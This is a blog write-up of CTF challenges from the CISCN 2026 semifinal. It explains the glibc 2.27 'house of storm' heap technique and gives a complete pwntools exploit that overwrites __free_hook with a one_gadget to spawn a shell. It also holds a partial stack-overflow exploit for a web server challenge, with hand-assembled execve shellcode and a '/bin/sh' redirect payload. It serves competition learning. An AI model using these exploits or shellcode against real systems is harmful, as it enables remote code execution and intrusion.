---
date: 2026-03-24 10:31:59
layout: post
title: Catchme at the House of Storm
subtitle: CISCN 2026 半决赛 writeup
description: >-
    Catchme exploit and the server_80 hack
image: >-
  /assets/img/uploads/shenyang.jpg
optimized_image: >-
  /assets/img/uploads/shenyang.jpg
category: ctf
tags:
  - heap pwn
  - house of storm
  - penetration testing
author: rosayxy
paginate: true
---

本人上周末和队友以 dubder 的名号参加了 CISCN 2026 半决赛（辽宁赛区），其中在 Catchme 这个 pwn 题目拿了赛区的三血，但是其实比赛的时候并不太明白原理，就是抄 house of storm 莫名凭感觉调出来了hh，现在在回过来学习原理并且记一下 writeup，顺带记一下渗透测试赛第一题 RCE 的 writeup

## Catchme

### house of storm

主要参考的是 [how2heap](https://github.com/shellphish/how2heap/blob/master/glibc_2.27/house_of_storm.c)

我们来分析一下调用序列：

```c
unsorted_bin = malloc(0x4e8);

malloc(0x18);  // prevent merging

heap_max_bit = heap_base >> 40; // 0x55 or 0x56

alloc_size = heap_max_bit == 0x55? 0x44: 0x46;

if (alloc_size == 0x44){

    return 1;
}else{
    for(int i = 0; i < 7; i++){
        tcache[i] = malloc(alloc_size);
    }
    for (int i = 0; i < 7; i++){
        free(tcache[i]);
    }
}

large_bin = malloc(0x4d8);

malloc(0x18);

free(large_bin);  // put small chunks first 
free(unsorted_bin);

unsorted_bin = malloc(0x4e8);
free(unsorted_bin);

fake_chunk = target - 0x10;
unsorted_bin->bk = fake_chunk;
largebin->bk = fake_chunk + 8;
largebin->bk_nextsize = fake_chunk - 0x18 - 5; // 原先代码中有 shift_amount，易得对常见的堆块范围（0x5500 0000 0000 - 0x5700 0000 0000）来说，这个值都是 5

ptr = calloc(alloc_size, 1); // which gets points to our target

```

简单画了堆图如下
![alt_text](/assets/img/uploads/house_of_storm.jpg)

我们分析一下这个过程，从最后成功利用的 calloc 出发，calloc 还是调用回我们熟悉的 __int_malloc，那我们接着看 __int_malloc 的流程

一开始的 fastbin 和 smallbin 的检查都不会对我们的分配造成影响，直到来到遍历 unsorted bin 的大循环

整体如下：第一轮循环中，会通过 unsorted bin 和 largebin 的共同风水，使得我们的 target 被填充合理的 fake chunk 内容放到 unsorted bin 中

接着第二轮循环会直接把该 chunk 作为 exact fit 拿出来，注意直接返回该 chunk 的条件是 **tcache 已经被填满**，不然分配还是会先把该 chunk 给放到 tcache 里面去，等 tcache 已经被填满才会直接返回，而如果第二轮循环没有直接返回的话，第三轮循环的指针就是崩坏的，所以 malloc 会报错然后 abort 掉

第一轮循环中存在以下几处赋值，首先赋值 target->fd，为[源码中以下代码](https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c#L3778)

```c
        /* remove from unsorted list */
          unsorted_chunks (av)->bk = bck;
          bck->fd = unsorted_chunks (av);
```

此时，bck->fd 就是我们 target 的地址，赋值为 unsorted_chunks(av)，也就是 unsorted bin 的头指针，接着又有通过那个 target - 0x18 - 5 的偏移[赋值 target size](https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c#L3856)

```c
victim->fd_nextsize = fwd;
victim->bk_nextsize = fwd->bk_nextsize;
fwd->bk_nextsize = victim;
// 赋值 target size
victim->bk_nextsize->fd_nextsize = victim;
```

然后[后面这里](https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c#L3868)

```c
mark_bin (av, victim_index);
victim->bk = bck;
victim->fd = fwd;
fwd->bk = victim;
bck->fd = victim;
```
赋值 target->fd

最终赋值完一遍的 target 如上

![alt_text](/assets/img/uploads/house_of_storm_faking_target.png)

可见它直接连入 unsorted bin 的链表中了，并且 size 字段为合理的取值，所以在第二轮循环中就会直接被当做 exact fit 拿出来了

这些是怎么调出来的呢？首先是 Docker 环境装了 libc6-dbg，这样 pwndbg 调试就能有符号了

然后打 watchpoint，如 `awatch *(long long*)0x562d08402040` 这种，来看内存的变化，同时配合反编译 + ai 分析语义来看这些代码在干啥

最后就是进 int_malloc 然后不断 s 来看具体是走到哪里了，然后就能大概整明白这个 house 是在干啥了

### 题目本身

题目给的条件比较怪，一看就知道肯定是在考某个特定的利用技巧：

- libc 版本是 2.27
- malloc size 固定，只有 malloc 0x430, malloc 0x440, calloc 0x48 三种
- 有 UAF 漏洞，但是只能 leak 一次，edit 三次，且 leak 是用 printf %s 来做的所以难以同时输出 libc 地址和堆地址，只能输出 libc 地址（这是肯定需要的）
- edit 是从堆块偏移 0x8 的位置开始，能写 0x18 字节的内容
- 有泄露堆地址的最后 5 个 digit，当时以为有用，但是分析完一遍 house of storm 之后发现没啥用... 可能是出题人混淆视听~~或者他也没太明白 house of storm 的条件....~~

没打过这种利用条件，那就现看 how2heap 现对着 libc 调试呗，而且断网比赛之前没准备源码...纯是对着 libc 的反编译猜它在干啥，还是有点折腾的哈哈，~~但是就这种条件还能拿赛区三血，我真厉害~~

### 利用思路

1. uaf leak libc 地址
2. 利用 house of storm 的思路构造任意地址分配，消耗两次 edit 次数，我们把堆块分配到 free hook 那里
3. 消耗第三次 edit 次数，改 free hook 的内容为 one_gadget 的地址（2.31 以前的版本 one_gadget 利用条件较弱，哪像 2.35 和 2.39 one_gadget 几乎不可用的）
4. free 触发 one_gadget get shell


下面这个 one_gadget 正好符合利用条件
```sh
0x4f302 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL || {[rsp+0x40], [rsp+0x48], [rsp+0x50], [rsp+0x58], ...} is a valid argv
```

### exp
```py
from pwn import *
context(log_level="debug")
# p = process("./catchme")
p = remote("10.11.253.44", 25358)
libc = ELF("./libc-2.27.so")
# 1. leak libc uaf
# 2. house of storm?

# we guess the target chunk size to be 0x55 or 0x56, for which the only possible alloc size is 0x46

def adopt(ty):
    p.recvuntil(">>\n")
    p.sendline("1")
    p.recvuntil("(3)otter\n")
    p.sendline(str(ty))

def release(idx):
    p.recvuntil(">>\n")
    p.sendline("2")
    p.recvuntil("index:\n")
    p.sendline(str(idx))

def inspect(idx):
    p.recvuntil(">>\n")
    p.sendline("3")
    p.recvuntil("index:\n")
    p.sendline(str(idx))

def engrave(idx, content):
    p.recvuntil(">>\n")
    p.sendline("4")
    p.recvuntil("index:\n")
    p.sendline(str(idx))
    p.recvuntil("set tag:\n")
    p.send(content)

def purge(idx):
    p.recvuntil(">>\n")
    p.sendline("6")
    p.recvuntil("index:\n")
    p.sendline(str(idx))

adopt(2) # unsorted, 0
adopt(3) # 1
alloc_size = 0x46 # 碰那个堆高位 0x56 的情况

adopt(1) # largebin, 2
adopt(3) # prevent merging with head, 3
purge(3)
for i in range(7):
    adopt(3)
    release(3)
    purge(3)

release(2)
inspect(2)

p.recvuntil("tag:")
libc_leak = u64(p.recv(6).ljust(8, b"\x00"))
log.info(f"libc_leak: {hex(libc_leak)}")

libc_base = libc_leak - 0x3ebca0
log.info(f"libc base: {hex(libc_base)}")

free_hook = libc_base + 0x3ed8e8
target = free_hook - 8

release(0)

adopt(2) # 3
release(3)

fake_chunk = target - 0x10
shift_amount = 5
# edit 4

engrave(3, p64(fake_chunk))
engrave(2, p64(fake_chunk + 8) + p64(fake_chunk - 0x18 - shift_amount) * 2)

adopt(3)
engrave(4, p64(0x4f302 + libc_base))
# trigger

release(1)
p.interactive()
```

### patch

没错，我打出来了，但是没 patch 成功...

我当时的思路主要是不影响程序本身，同时防止利用成功，所以想的 patch 是改 malloc 的 size，让 unsorted bin 大于 large bin size 的利用条件失效，这种方法 patch 一直是*服务异常*的状态...

比完赛后和其他队的师傅们聊了一下，应该是只能把 UAF 给完全 patch 掉才满足 checker 的要求，有点无语

## server_80

第一道渗透测试题，有任意文件读取之后需要 rce，是个栈题，不难

因为时间原因，最后本地基本能出但是远程还没来得及打，这是半成品的 exp

以及比赛的时候 pwntools 的 asm 抽风了不太能 assemble 汇编，最后被逼无奈用的 keypatch，直接把汇编转为机器码，也真是服了....

```py
#!/usr/bin/env python3
import socket
from pwn import *

# 配置目标地址和端口
HOST = "localhost"
PORT = 8000
URL = f"http://{HOST}:{PORT}"

def encode_string(s):
    """
    将普通 ASCII 字符串编码为 URI 格式 (%XX)，以便能被 uri_unescape 正确解码。
    注意：此函数会将所有非字母数字字符转换为 %XX，因为 C 函数会丢弃它们。
    如果你希望保留 /, -, _ 等符号，需要在编码前手动替换掉这些符号。
    """
    result = []
    
    for c in s:
        # 如果已经是合法的 URI 安全字符 (字母数字), 直接加进去? 
        # 不，根据 C 代码逻辑：C 函数会跳过所有非 %XX 的字符。
        # 所以为了能被该函数解密出来，输入给 decode_string 的东西必须是纯 %XX 序列。
        # 但通常我们需要把普通字符串变成 URI 格式。
        char = chr(c)
        print(c)
        if char.isalnum() and ord(char) < 0x80:
            print("is alpha num " + str(c))
            result.append(char)
        else:
            # 将非字母数字字符转换为 %XX
            hex_val = format(ord(char), '02X')
            result.append(f'%{hex_val}')
            
    return ''.join(result)

def send_request(method, path, data=None):
    """
    发送 HTTP 请求并返回响应
    :param method: GET 或 POST
    :param path: URL 路径 (如 /test, /foo/bar)
    :param data: POST 时的 payload 数据
    :return: 服务器响应的字符串
    """
    
    # 构建 HTTP 请求头
    headers = {
        "Host": HOST,
        "User-Agent": "Python-PwnTools-Client/1.0",
        "Connection": "close"
    }
    
    if method == "GET":
        request_line = f"{method} {path} HTTP/1.1\r\n"
        body = ""
    else: # POST
        request_line = f"{method} {path} HTTP/1.1\r\n"
        body = data
    
    # 组装完整请求
    full_request = (f"{request_line}\r\n") + "\r\n".join(f"{k}: {v}" for k, v in headers.items()) + "\r\n" + body + "\r\n--END--\n"
    
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((HOST, PORT))
            s.sendall(full_request.encode('utf-8'))
            
            # 接收响应直到看到 \r\n\r\n (HTTP 响应的结束符)
            response = b""
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                response += chunk
                if b"\r\n\r\n" in response:
                    # 找到结束位置，截取 HTTP 响应部分
                    idx = response.find(b"\r\n\r\n") + 4
                    return response[:idx].decode('utf-8', errors='ignore')
            return response.decode('utf-8', errors='ignore')

    except Exception as e:
        print(f"连接错误：{e}")
        return None

def main():
    print("=" * 30)
    print("开始测试服务器交互...")
    print("=" * 30)

    stack_top = 0x7ffffffff000 # TODO
    stack_buf = stack_top - 0x2540
# writing assembly

    payload = b"a"* 0x20 + b"exec 0<&4 1>&4 2>&4; exec /bin/sh;"
    # payload = b"exec%200%2C%264%201%3E%264%202%3E%264%3B%20exec%20%2Fbin%2Fsh%3B"
    syscall_asm = '''
        lea %rdi, [rsp-0x108]
        xor %rsi, %rsi
        xor %rdx, %rdx
        mov $59, %rax
        syscall
    '''
    syscall_asm = b"\x48\x8D\xBC\x24\xF8\xFE\xFF\xFF" + b"\x48\x31\xf6" + b"\x48\x31\xd2" + b"\xb0\x3b" + b"\x0f\x05"

    payload += syscall_asm
    payload = payload.ljust(0x120, b"a") + p64(stack_buf + 0x28 + len("exec 0<&4 1>&4 2>&4; exec /bin/sh;") + 1)[:6]
    payload = encode_string(payload)
    print("encoded payload\n")
    print(payload.encode("latin-1"))
    print("\n[4] 尝试访问非存在的随机路径 (/random/path)")
    resp = send_request("GET", payload)
    print(resp)
    # gap till the stack top is known

if __name__ == "__main__":
    main()

```